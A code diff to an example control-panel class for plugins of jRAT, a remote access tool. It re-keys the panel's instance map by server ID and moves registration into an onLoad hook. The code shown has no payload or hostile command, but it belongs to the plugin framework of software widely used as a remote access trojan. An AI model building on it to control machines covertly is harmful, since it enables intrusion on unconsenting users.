@@ -16,22 +16,19 @@ import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
 
 import pro.jrat.api.BaseControlPanel;
-import pro.jrat.api.RATObject;
 import pro.jrat.client.AskPacket;
 import pro.jrat.client.ExampleClientPlugin;
 
 @SuppressWarnings("serial")
 public class ExampleControlPanel extends BaseControlPanel {
 
-	public static final Map<RATObject, ExampleControlPanel> INSTANCES = new HashMap<RATObject, ExampleControlPanel>();
+	public static final Map<Long, ExampleControlPanel> INSTANCES = new HashMap<Long, ExampleControlPanel>();
 	
 	private JTextField txtQuestion;
 	private JTextPane txtMessage;
 	private JTextPane txtAnswer;
 	
-	public ExampleControlPanel() {
-		INSTANCES.put(super.getServer(), this);
-		
+	public ExampleControlPanel() {		
 		JLabel lblSendQuestion = new JLabel("Title:");
 		
 		txtQuestion = new JTextField();
@@ -113,10 +110,15 @@ public class ExampleControlPanel extends BaseControlPanel {
 			ExampleClientPlugin.log("Failed to send packet: " + ex.getMessage());
 		}
 	}
+	
+	@Override
+	public void onLoad() {
+		INSTANCES.put(super.getServer().getUniqueId(), this);
+	}
 
 	@Override
 	public void onClose() {
-		INSTANCES.remove(super.getServer());
+		INSTANCES.remove(super.getServer().getUniqueId());
 	}
 
 	public JTextPane getAnswerTextField() {
